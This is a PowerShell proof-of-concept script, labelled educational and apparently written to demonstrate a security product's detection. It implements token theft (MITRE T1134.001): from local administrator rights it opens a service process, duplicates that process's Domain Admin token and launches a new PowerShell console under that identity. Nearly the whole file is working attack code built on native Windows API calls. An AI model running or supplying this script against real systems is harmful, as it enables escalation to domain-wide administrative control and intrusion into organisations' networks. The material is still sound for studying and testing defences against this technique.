#requires -RunAsAdministrator
<#
.SYNOPSIS
    Token Theft PoC -- demonstrates privilege escalation via process token impersonation.
    For educational use only.

.DESCRIPTION
    Attack scenario:
    - Attacker is a LOCAL ADMINISTRATOR on a member server (not a Domain Admin)
    - A Windows service on that server runs under a Domain Admin account
    - Attacker steals the service process token and launches PowerShell as Domain Admin

    This is a well-known technique (T1134.001 - Access Token Manipulation: Token
    Impersonation/Theft) that NTP detects and can block in real time.

.PARAMETER ProcessName
    Name of the target process running under the privileged account (e.g. "MyService").

.PARAMETER ProcessId
    PID of the target process. Use this if multiple instances exist.

.EXAMPLE
    # Find and steal token from a service running as domain admin
    .\Invoke-TokenTheft.ps1 -ProcessName "MyAppService"

.EXAMPLE
    # Steal token by PID
    .\Invoke-TokenTheft.ps1 -ProcessId 3824
#>
[CmdletBinding(DefaultParameterSetName = 'ByName')]
param(
    [Parameter(Mandatory, ParameterSetName = 'ByName')]
    [string]$ProcessName,

    [Parameter(Mandatory, ParameterSetName = 'ByPid')]
    [int]$ProcessId
)

$ErrorActionPreference = 'Stop'

# --- P/Invoke definitions ---------------------------------------------------

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public static class NativeToken
{
    // --- Constants ----------------------------------------------------------
    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    public const uint TOKEN_DUPLICATE  = 0x0002;
    public const uint TOKEN_QUERY      = 0x0008;
    public const uint MAXIMUM_ALLOWED  = 0x02000000;

    public const int SecurityImpersonation = 2;   // SECURITY_IMPERSONATION_LEVEL
    public const int TokenPrimary          = 1;   // TOKEN_TYPE

    public const uint CREATE_NEW_CONSOLE  = 0x00000010;
    public const uint LOGON_WITH_PROFILE  = 0x00000001;

    // --- Structs ------------------------------------------------------------
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public int    cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int    dwX, dwY, dwXSize, dwYSize;
        public int    dwXCountChars, dwYCountChars;
        public int    dwFillAttribute;
        public int    dwFlags;
        public short  wShowWindow;
        public short  cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int    dwProcessId;
        public int    dwThreadId;
    }

    // --- Imports ------------------------------------------------------------
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DuplicateTokenEx(
        IntPtr   hExistingToken,
        uint     dwDesiredAccess,
        IntPtr   lpTokenAttributes,
        int      ImpersonationLevel,
        int      TokenType,
        out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        uint   dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint   dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO        lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    // --- Helper: throw on Win32 error --------------------------------------
    public static void ThrowLastWin32(string context)
    {
        throw new Win32Exception(Marshal.GetLastWin32Error(), context);
    }
}
"@

# --- Resolve target process --------------------------------------------------

if ($PSCmdlet.ParameterSetName -eq 'ByName') {
    $procs = @(Get-Process -Name $ProcessName -ErrorAction SilentlyContinue)
    if ($procs.Count -eq 0) {
        throw "Process '$ProcessName' not found. Is the service running?"
    }
    if ($procs.Count -gt 1) {
        Write-Warning "Multiple '$ProcessName' processes found -- using first (PID $($procs[0].Id))."
    }
    $targetPid = $procs[0].Id
} else {
    $targetPid = $ProcessId
}

# Show target process info
$targetProc = Get-Process -Id $targetPid -ErrorAction Stop
$owner = (Get-WmiObject Win32_Process -Filter "ProcessId = $targetPid").GetOwner()
$ownerName = if ($owner.Domain) { "$($owner.Domain)\$($owner.User)" } else { "(unknown)" }

Write-Host ""
Write-Host "=== Token Theft PoC ===" -ForegroundColor Red
Write-Host ""
Write-Host "  Target process : $($targetProc.Name) (PID $targetPid)"
Write-Host "  Running as     : $ownerName"
Write-Host "  Attacker       : $env:USERDOMAIN\$env:USERNAME"
Write-Host ""

# --- Step 1: Open the target process -----------------------------------------

Write-Host "[1] Opening target process..." -ForegroundColor Yellow

$hProcess = [NativeToken]::OpenProcess(
    [NativeToken]::PROCESS_QUERY_LIMITED_INFORMATION,
    $false,
    $targetPid)

if ($hProcess -eq [IntPtr]::Zero) {
    [NativeToken]::ThrowLastWin32("OpenProcess failed for PID $targetPid")
}
Write-Host "    Handle obtained: 0x$($hProcess.ToString('X'))" -ForegroundColor Green

# --- Step 2: Open the process token ------------------------------------------

Write-Host "[2] Opening process token..." -ForegroundColor Yellow

$hToken = [IntPtr]::Zero
$ok = [NativeToken]::OpenProcessToken(
    $hProcess,
    [NativeToken]::TOKEN_DUPLICATE -bor [NativeToken]::TOKEN_QUERY,
    [ref]$hToken)

if (-not $ok) {
    [NativeToken]::CloseHandle($hProcess) | Out-Null
    [NativeToken]::ThrowLastWin32("OpenProcessToken failed")
}
Write-Host "    Token handle: 0x$($hToken.ToString('X'))" -ForegroundColor Green

# --- Step 3: Duplicate the token as a primary token --------------------------

Write-Host "[3] Duplicating token (Impersonation -> Primary)..." -ForegroundColor Yellow

$hDupToken = [IntPtr]::Zero
$ok = [NativeToken]::DuplicateTokenEx(
    $hToken,
    [NativeToken]::MAXIMUM_ALLOWED,
    [IntPtr]::Zero,
    [NativeToken]::SecurityImpersonation,
    [NativeToken]::TokenPrimary,
    [ref]$hDupToken)

if (-not $ok) {
    [NativeToken]::CloseHandle($hToken)    | Out-Null
    [NativeToken]::CloseHandle($hProcess)  | Out-Null
    [NativeToken]::ThrowLastWin32("DuplicateTokenEx failed")
}
Write-Host "    Duplicated token: 0x$($hDupToken.ToString('X'))" -ForegroundColor Green

# --- Step 4: Launch PowerShell with the stolen token -------------------------

Write-Host "[4] Launching PowerShell with stolen Domain Admin token..." -ForegroundColor Yellow

$si = New-Object NativeToken+STARTUPINFO
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
$si.lpDesktop = "winsta0\default"

$pi = New-Object NativeToken+PROCESS_INFORMATION

$psPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$cmdLine = 'powershell.exe -NoExit -Command "Write-Host ''Token Theft Successful'' -ForegroundColor Red; whoami"'
$workDir = $env:SystemRoot

$ok = [NativeToken]::CreateProcessWithTokenW(
    $hDupToken,
    [NativeToken]::LOGON_WITH_PROFILE,
    $psPath,
    $cmdLine,
    [NativeToken]::CREATE_NEW_CONSOLE,
    [IntPtr]::Zero,
    $workDir,
    [ref]$si,
    [ref]$pi)

if (-not $ok) {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    [NativeToken]::CloseHandle($hDupToken) | Out-Null
    [NativeToken]::CloseHandle($hToken)    | Out-Null
    [NativeToken]::CloseHandle($hProcess)  | Out-Null
    [NativeToken]::ThrowLastWin32("CreateProcessWithTokenW failed (error $err)")
}

Write-Host ""
Write-Host "  SUCCESS -- PowerShell launched as $ownerName" -ForegroundColor Red
Write-Host "  New process PID: $($pi.dwProcessId)" -ForegroundColor Red
Write-Host ""
Write-Host "  MITRE ATT&CK: T1134.001 (Access Token Manipulation: Token Impersonation/Theft)"
Write-Host ""

# --- Cleanup handles ---------------------------------------------------------

[NativeToken]::CloseHandle($pi.hProcess)  | Out-Null
[NativeToken]::CloseHandle($pi.hThread)   | Out-Null
[NativeToken]::CloseHandle($hDupToken)    | Out-Null
[NativeToken]::CloseHandle($hToken)       | Out-Null
[NativeToken]::CloseHandle($hProcess)     | Out-Null

